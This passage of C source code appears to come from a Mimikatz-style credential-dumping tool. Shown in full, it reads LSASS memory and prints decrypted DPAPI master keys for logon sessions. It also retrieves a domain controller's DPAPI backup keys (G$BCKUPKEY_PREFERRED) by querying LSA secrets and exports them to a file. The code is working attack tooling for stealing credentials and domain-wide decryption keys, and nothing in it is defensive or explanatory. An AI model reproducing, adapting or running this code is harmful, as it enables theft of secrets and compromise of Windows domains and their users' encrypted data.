	PKUHL_M_SEKURLSA_PACKAGE pPackage = (pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
	DWORD monNb = 0;

	if (pData->LogonType != Network) {
		if (pPackage->Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &pPackage->Module, MasterKeyCacheReferences, ARRAYSIZE(MasterKeyCacheReferences), (PVOID*)&pMasterKeyCacheList, NULL, NULL, NULL))
		{
			aLsass.address = pMasterKeyCacheList;
			if (kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY))) {
				
				aLsass.address = mesCredentials.Flink;
				while (aLsass.address != pMasterKeyCacheList) {
					if (kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_MASTERKEY_CACHE_ENTRY))) {
						if (SecEqualLuid(pData->LogonId, &mesCredentials.LogonId)) {
							
							wprintf(L"\t [%08x]\n\t  GUID      :\t", monNb++);
							kull_m_string_displayGUID(&mesCredentials.KeyUid);
							if (aKey.address = LocalAlloc(LPTR, mesCredentials.keySize)) {
								aLsass.address = (PBYTE)aLsass.address + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key);
								if (kull_m_memory_copy(&aKey, &aLsass, mesCredentials.keySize)) {

									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
									wprintf(L"\n\t  MasterKey :\t"); string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
								}
								LocalFree(aKey.address);
							}
							wprintf(L"\n");
						}
						aLsass.address = mesCredentials.Flink;
					}
					else break;
				}
			}
		}
		
	}
	return TRUE;
}

NTSTATUS kuhl_m_sekurlsa_dpapi()
{	
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_dpapi, NULL);
	return STATUS_SUCCESS;
}





//domain controller backup keys
NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR systemName, PCWSTR secretName, PUNICODE_STRING secret, BOOL isSecret)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	LSA_OBJECT_ATTRIBUTES oa = { 0 };
	LSA_HANDLE hPolicy, hSecret;
	UNICODE_STRING name, system, * cur, * old;
	LARGE_INTEGER curDate, oldDate;

	if (secretName)
	{
		RtlInitUnicodeString(&name, secretName);
		RtlInitUnicodeString(&system, systemName);
		status = LsaOpenPolicy(&system, &oa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy);
		if (NT_SUCCESS(status))
		{
				status = LsaOpenSecret(hPolicy, &name, SECRET_QUERY_VALUE, &hSecret);
				if (NT_SUCCESS(status))
				{
					status = LsaQuerySecret(hSecret, &cur, &curDate, &old, &oldDate);
					if (NT_SUCCESS(status))
					{
						if (cur)
						{
							*secret = *cur;
							if (secret->Buffer = (PWSTR)LocalAlloc(LPTR, secret->MaximumLength))
								RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
							LsaFreeMemory(cur);
						}
						if (old)
							LsaFreeMemory(old);
					}
					LsaClose(hSecret);
				}
			LsaClose(hPolicy);
		}
	}
	return status;
}

void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size, BOOL isExport)
{
	PVOID data;
	DWORD len;
	UNICODE_STRING uString;
	PWCHAR filename = NULL, shortname;

	if (NT_SUCCESS(RtlStringFromGUID(guid, &uString)))
	{
		uString.Buffer[uString.Length / sizeof(wchar_t) - 1] = L'\0';
		shortname = uString.Buffer + 1;
		switch (secret->version)
		{
		case 2:
			//kuhl_m_dpapi_oe_domainkey_add(guid, secret->data, secret->keyLen, TRUE);
			kuhl_m_crypto_exportRawKeyToFile(secret->data, secret->keyLen, FALSE, AT_KEYEXCHANGE, PROV_RSA_FULL, L"ntds", 0, shortname, isExport, FALSE);
			break;
		}
		myRtlFreeUnicodeString(&uString);
	}
}

NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isSecret)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING secret;
	wchar_t keyName[48 + 1] = L"G$BCKUPKEY_";
	keyName[48] = L'\0';

	if (NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
	{
		RtlCopyMemory(keyName + 11, secret.Buffer + 1, 36 * sizeof(wchar_t));
		myRtlFreeUnicodeString(&secret);

		status = kuhl_m_lsadump_LsaRetrievePrivateData(systemName, keyName, &secret, isSecret);
		if (NT_SUCCESS(status))
		{
			kuhl_m_lsadump_analyzeKey(guid, (PKIWI_BACKUP_KEY)secret.Buffer, secret.Length, isExport);
			LocalFree(secret.Buffer);
		}
	}
	return status;
}

int kuhl_m_lsadump_bkey(LPWSTR cmdline)
{
	NTSTATUS status;
	UNICODE_STRING secret;
	//wchar_t szSystem [260 * 2];
	BOOL export = TRUE;
	BOOL isSecret = FALSE;
	wchar_t* szSystem;

	//printf("DC Hostname: ");
	//wscanf(L"%ls", &szSystem);
	szSystem = cmdline;

	status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, L"G$BCKUPKEY_PREFERRED", &secret, isSecret);
	if (NT_SUCCESS(status)) {
		//kull_m_string_displayGUID((LPCGUID)secret.Buffer); 
		//wprintf(L"\n");
		kuhl_m_lsadump_getKeyFromGUID((LPCGUID)secret.Buffer, export, szSystem, isSecret);
		LocalFree(secret.Buffer);
	}
	else return 0;

	return 1;
}